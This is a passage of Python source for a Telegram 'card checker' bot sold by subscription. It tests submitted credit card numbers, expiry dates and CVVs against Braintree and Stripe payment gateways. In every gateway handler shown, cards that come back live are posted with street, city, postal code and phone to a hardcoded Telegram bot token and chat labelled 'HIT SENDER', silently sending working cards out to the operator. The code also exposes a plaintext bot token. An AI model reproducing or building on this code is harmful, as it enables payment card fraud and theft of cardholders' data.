		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="Dev", url="https://t.me/callmekaiz")
		ahmed = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}

𝗬𝗢𝗨𝗥 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗣𝗟𝗔𝗡: {BL}

𝗨𝗦𝗘 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗧𝗢 𝗕𝗨𝗬 𝗔𝗖𝗖𝗘𝗦𝗦, 𝗗𝗠 @callmekaiz</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="Dev", url="https://t.me/callmekaiz")
		ahmed = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}

𝗬𝗢𝗨𝗥 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗣𝗟𝗔𝗡: {BL}

𝗨𝗦𝗘 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗧𝗢 𝗕𝗨𝗬 𝗔𝗖𝗖𝗘𝗦𝗦, 𝗗𝗠 @callmekaiz</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="Dev", url="https://t.me/callmekaiz")
		ahmed = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>Uh oh! Seems like your subscription is expired, please contact admin to renew it</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(scc(cc))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://binlist.io/lookup/'+cc[:6]).json()
	except: pass
	try:
		level = data['level']
	except:
		level = 'unknown'
	try:
		brand = data['brand']
	except:
		brand = 'unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'unknown'
	try:
		country = data['country']
		country_flag = data['country_flag']
	except:
		country = 'unknown'
		country_flag = 'unknown'
	try:
		bank = data['bank']
	except:
		bank = 'unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>𝗦𝗧𝗔𝗧𝗨𝗦: 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
- - - - - - - - - - - - - - - - - - - - - - -
𝗖𝗮𝗿𝗱 » <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 » {last}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 » {gate}
- - - - - - - - - - - - - - - - - - - - - - -
𝗜𝗻𝗳𝗼 » <code>{cc[:6]}</code> - <code>{card_type} - {brand}</code>
𝗜𝘀𝘀𝘂𝗲𝗿 » <code>{bank}</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 » <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
𝗧𝗶𝗺𝗲 » {"{:.1f}".format(execution_time)} seconds
𝗨𝗽𝗱𝗮𝘁𝗲𝘀 » @DrakeUpdates'''
	msgd=f'''<b>𝗦𝗧𝗔𝗧𝗨𝗦: 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌
- - - - - - - - - - - - - - - - - - - - - - -
𝗖𝗮𝗿𝗱 » <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 » {last}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 » {gate}
- - - - - - - - - - - - - - - - - - - - - - -
𝗜𝗻𝗳𝗼 » <code>{cc[:6]}</code> - <code>{card_type} - {brand}</code>
𝗜𝘀𝘀𝘂𝗲𝗿 » <code>{bank}</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 » <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
𝗧𝗶𝗺𝗲 » {"{:.1f}".format(execution_time)} seconds
𝗨𝗽𝗱𝗮𝘁𝗲𝘀 » @DrakeUpdates</b>'''
	if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'live' in last:
		tok = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
		acc =  '-4248306465'
		mg = f"""<b>❆══════» 𝗗𝗥𝗔𝗞𝗘'𝗦 «══════❆
𝗖𝗖 » <code>{cc}</code>
❆══════» 𝗫𝗧𝗥𝗔𝘀 «══════❆
𝗕𝗜𝗡 » <code>{cc[:6]}</code>
𝗜𝗡𝗙𝗢 » {brand} - {card_type} - {level}
𝗕𝗔𝗡𝗞 » {bank}
𝗖𝗢𝗨𝗡𝗧𝗥𝗬 » {country} - {country_flag}
❆═════» 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 «═════❆
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
		acb =  '-4248306465'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def respond_to_vbv(message):
	gate='𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵'
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="Dev", url="https://t.me/callmekaiz")
		ahmed = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}

𝗬𝗢𝗨𝗥 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗣𝗟𝗔𝗡: {BL}

𝗨𝗦𝗘 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗧𝗢 𝗕𝗨𝗬 𝗔𝗖𝗖𝗘𝗦𝗦, 𝗗𝗠 @callmekaiz</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="Dev", url="https://t.me/callmekaiz")
		ahmed = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}

𝗬𝗢𝗨𝗥 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗣𝗟𝗔𝗡: {BL}

𝗨𝗦𝗘 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗧𝗢 𝗕𝗨𝗬 𝗔𝗖𝗖𝗘𝗦𝗦, 𝗗𝗠 @callmekaiz</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="Dev", url="https://t.me/callmekaiz")
		ahmed = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>Uh oh! Seems like your subscription is expired, please contact admin to renew it</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(Tele(cc))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://binlist.io/lookup/'+cc[:6]).json()
	except: pass
	try:
		level = data['level']
	except:
	    level = 'unknown'
	try:
		brand = data['brand']
	except:
		brand = 'unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'unknown'
		country_flag = 'unknown'
	try:
		bank = data['bank']
	except:
		bank = 'unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>𝗦𝗧𝗔𝗧𝗨𝗦: 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
𝗖𝗮𝗿𝗱 » <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 » {last}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 » {gate}		
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 » <code>{country} - {country_flag}</code> 
𝗜𝗻𝗳𝗼 » <code>{cc[:6]} - {card_type} - {brand}</code>
𝗜𝘀𝘀𝘂𝗲𝗿 » <code>{bank}</code>
𝗧𝗶𝗺𝗲 » {"{:.1f}".format(execution_time)}
𝗨𝗽𝗱𝗮𝘁𝗲𝘀 » @DrakeUpdates</b>'''
	msgd=f'''<b>𝗦𝗧𝗔𝗧𝗨𝗦: 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌
𝗖𝗮𝗿𝗱 » <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 » {last}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 » {gate}		
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 » <code>{country} - {country_flag}</code> 
𝗜𝗻𝗳𝗼 » <code>{cc[:6]} - {card_type} - {brand}</code>
𝗜𝘀𝘀𝘂𝗲𝗿 » <code>{bank}</code>
𝗧𝗶𝗺𝗲 » {"{:.1f}".format(execution_time)}
𝗨𝗽𝗱𝗮𝘁𝗲𝘀 » @DrakeUpdates</b>'''
	if "Funds" in last or 'Insufficient Funds' in last or 'avs' in last or '1000: Approved' in last or 'Duplicate' in last or 'Approved' in last:
		tok = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
		acc =  '-4248306465'
		mg = f"""<b>❆══════» 𝗗𝗥𝗔𝗞𝗘'𝗦 «══════❆
𝗖𝗖 » <code>{cc}</code>
❆══════» 𝗫𝗧𝗥𝗔𝘀 «══════❆
𝗕𝗜𝗡 » <code>{cc[:6]}</code>
𝗜𝗡𝗙𝗢 » {brand} - {card_type} - {level}
𝗕𝗔𝗡𝗞 » {bank}
𝗖𝗢𝗨𝗡𝗧𝗥𝗬 » {country} - {country_flag}
❆═════» 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 «═════❆
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
		acb =  '-4248306465'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tlg_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tlg_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.str') or message.text.lower().startswith('/str'))
def respond_to_vbv(message):
	gate='𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲'
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="Dev", url="https://t.me/callmekaiz")
		ahmed = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}

𝗬𝗢𝗨𝗥 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗣𝗟𝗔𝗡: {BL}

𝗨𝗦𝗘 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗧𝗢 𝗕𝗨𝗬 𝗔𝗖𝗖𝗘𝗦𝗦, 𝗗𝗠 @callmekaiz</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="Dev", url="https://t.me/callmekaiz")
		ahmed = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}

𝗬𝗢𝗨𝗥 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗣𝗟𝗔𝗡: {BL}

𝗨𝗦𝗘 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗧𝗢 𝗕𝗨𝗬 𝗔𝗖𝗖𝗘𝗦𝗦, 𝗗𝗠 @callmekaiz</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="Dev", url="https://t.me/callmekaiz")
		ahmed = types.InlineKeyboardButton(text="Updates", url="https://t.me/DrakeUpdates")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>Uh oh! Seems like your subscription is expired, please contact admin to renew it</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(st(cc))
	except Exception as e:
		last='Error'
		print(e)
	try: data = requests.get('https://binlist.io/lookup/'+cc[:6]).json()
	except: pass
	try:
	    level = data['level']
	except:
	    level = 'unknown'
	try:
		brand = data['brand']
	except:
		brand = 'unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'unknown'
	try:
		country = data['country']
		country_flag = data['country_flag']
	except:
		country = 'unknown'
		country_flag = 'unknown'
	try:
		bank = data['bank']
	except:
		bank = 'unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msgd=f'''<b>𝗦𝗧𝗔𝗧𝗨𝗦: 𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌
- - - - - - - - - - - - - - - - - - - - - - -
𝗖𝗮𝗿𝗱 » <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 » {last}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 » {gate}
- - - - - - - - - - - - - - - - - - - - - - -
𝗜𝗻𝗳𝗼 » <code>{cc[:6]}</code> - <code>{card_type} - {brand}</code>
𝗜𝘀𝘀𝘂𝗲𝗿 » <code>{bank}</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 » <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
𝗧𝗶𝗺𝗲 » {"{:.1f}".format(execution_time)} seconds
𝗨𝗽𝗱𝗮𝘁𝗲𝘀 » @DrakeUpdates</b>'''
	msg=f'''<b>𝗦𝗧𝗔𝗧𝗨𝗦: 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ✅
- - - - - - - - - - - - - - - - - - - - - - -
𝗖𝗮𝗿𝗱 » <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 » {last}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 » {gate}
- - - - - - - - - - - - - - - - - - - - - - -
𝗜𝗻𝗳𝗼 » <code>{cc[:6]}</code> - <code>{card_type} - {brand}</code>
𝗜𝘀𝘀𝘂𝗲𝗿 » <code>{bank}</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 » <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
𝗧𝗶𝗺𝗲 » {"{:.1f}".format(execution_time)} seconds
𝗨𝗽𝗱𝗮𝘁𝗲𝘀 » @DrakeUpdates'''
	msgc=f'''<b>𝗦𝗧𝗔𝗧𝗨𝗦: 𝗖𝗖𝗡 👍🏻
- - - - - - - - - - - - - - - - - - - - - - -
𝗖𝗮𝗿𝗱 » <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 » {last}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 » {gate}
- - - - - - - - - - - - - - - - - - - - - - -
𝗜𝗻𝗳𝗼 » <code>{cc[:6]}</code> - <code>{card_type} - {brand}</code>
𝗜𝘀𝘀𝘂𝗲𝗿 » <code>{bank}</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 » <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
𝗧𝗶𝗺𝗲 » {"{:.1f}".format(execution_time)} seconds
𝗨𝗽𝗱𝗮𝘁𝗲𝘀 » @DrakeUpdates'''
	msgf=f'''<b>𝗦𝗧𝗔𝗧𝗨𝗦: 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗙𝘂𝗻𝗱𝘀 👎🏻
- - - - - - - - - - - - - - - - - - - - - - -
𝗖𝗮𝗿𝗱 » <code>{cc}</code>
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 » {last}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 » {gate}
- - - - - - - - - - - - - - - - - - - - - - -
𝗜𝗻𝗳𝗼 » <code>{cc[:6]}</code> - <code>{card_type} - {brand}</code>
𝗜𝘀𝘀𝘂𝗲𝗿 » <code>{bank}</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 » <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
𝗧𝗶𝗺𝗲 » {"{:.1f}".format(execution_time)} seconds
𝗨𝗽𝗱𝗮𝘁𝗲𝘀 » @DrakeUpdates'''
	if 'success' in last:
		tok = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
		acc =  '-4248306465'
		mg = f"""<b>❆══════» 𝗗𝗥𝗔𝗞𝗘'𝗦 «══════❆
𝗖𝗖 » <code>{cc}</code>
❆══════» 𝗫𝗧𝗥𝗔𝘀 «══════❆
𝗕𝗜𝗡 » <code>{cc[:6]}</code>
𝗜𝗡𝗙𝗢 » {brand} - {card_type} - {level}
𝗕𝗔𝗡𝗞 » {bank}
𝗖𝗢𝗨𝗡𝗧𝗥𝗬 » {country} - {country_flag}
❆═════» 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 «═════❆
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
		acb =  '-4248306465'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	elif "funds" in last:
		tok = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
		acc =  '-4248306465'
		mg = f"""<b>❆══════» 𝗗𝗥𝗔𝗞𝗘'𝗦 «══════❆
𝗖𝗖 » <code>{cc}</code>
❆══════» 𝗫𝗧𝗥𝗔𝘀 «══════❆
𝗕𝗜𝗡 » <code>{cc[:6]}</code>
𝗜𝗡𝗙𝗢 » {brand} - {card_type} - {level}
𝗕𝗔𝗡𝗞 » {bank}
𝗖𝗢𝗨𝗡𝗧𝗥𝗬 » {country} - {country_flag}
❆═════» 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 «═════❆
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
		acb =  '-4248306465'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgf)
	elif "card's security" in last:
		tok = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
		acc =  '-4248306465'
		mg = f"""<b>❆══════» 𝗗𝗥𝗔𝗞𝗘'𝗦 «══════❆
𝗖𝗖 » <code>{cc}</code>
❆══════» 𝗫𝗧𝗥𝗔𝘀 «══════❆
𝗕𝗜𝗡 » <code>{cc[:6]}</code>
𝗜𝗡𝗙𝗢 » {brand} - {card_type} - {level}
𝗕𝗔𝗡𝗞 » {bank}
𝗖𝗢𝗨𝗡𝗧𝗥𝗬 » {country} - {country_flag}
❆═════» 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 «═════❆
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7371222023:AAH4iWENMmT1S6-lK1-p2F0i376YIP82-OI'
		acb =  '-4248306465'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgc)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def respond_to_vbv(message):
	def my_function():
		global stop
		try:
			re=message.text.split(' ')[1]
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			timer=(json_data[re]['time'])
			typ=(json_data[f"{re}"]["plan"])
			json_data[f"{message.from_user.id}"]['timer'] = timer
			json_data[f"{message.from_user.id}"]['plan'] = typ
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			with open('data.json', 'r') as json_file:
				data = json.load(json_file)
			del data[re]
			with open('data.json', 'w') as json_file:
				json.dump(data, json_file, ensure_ascii=False, indent=4)
			msg=f'''<b>𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲𝗱 𝘁𝗼 𝗩𝗜𝗣 ✅
𝗧𝘆𝗽𝗲 » {typ}
𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗲𝗻𝗱𝘀 » {timer}</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,'<b>Incorrect code or it has already been redeemed </b>',parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["code"])
def start(message):
	def my_function():
		id=message.from_user.id
		if user_id not in [admin, admin2]:
			return
		try:
			h=float(message.text.split(' ')[1])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			characters = string.ascii_uppercase + string.digits
			pas ='DRAKE-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
			current_time = datetime.now()
			ig = current_time + timedelta(hours=h)
